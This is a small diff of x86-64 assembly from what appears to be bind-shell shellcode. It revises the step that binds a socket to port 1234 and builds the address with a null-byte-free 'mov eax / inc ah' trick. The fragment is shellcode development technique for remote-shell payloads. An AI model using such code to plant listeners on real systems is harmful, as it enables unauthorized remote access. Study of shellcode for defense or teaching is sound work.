@@ -49,8 +49,8 @@
     
     ; step 2, bind to port 1234 
     ; bind(s, {AF_INET,1234,INADDR_ANY}, 16)
-    mov     rax, ~0x00000000d2040002
-    not     rax
+    mov     eax, 0xd204FF02
+    inc     ah
     push    rax
     push    rsp
     pop     rsi         ; rsi = &sa 
